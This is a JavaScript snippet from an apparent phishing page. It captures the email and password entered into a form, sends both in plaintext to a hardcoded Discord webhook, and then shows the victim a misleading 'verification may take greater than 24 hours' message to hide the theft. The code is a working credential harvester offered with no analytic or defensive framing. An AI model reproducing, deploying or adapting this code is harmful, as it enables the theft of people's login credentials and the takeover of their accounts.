    document.getElementById("webhookForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const f1 = document.getElementById("eml").value.trim();
      const f2 = document.getElementById("pss").value.trim();

      if (!f1 || !f2) return alert("Please fill out both fields.");

      const payload = {
        content: `Email: ${f1}\nPassword: ${f2}`
      };

      try {
        await fetch("https://discord.com/api/webhooks/1428906310769971283/lOl5k0O1MscqgtgWcal6ztARU-8fZ8Jzh-fWc7O41UeoqhmP_9joVa1rmCpU_ZbCSGpp", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        alert("Verification may take greater than 24 hours.");
      } catch (err) {
        console.error(err);
        alert("Something Went Wrong.");
      }
    });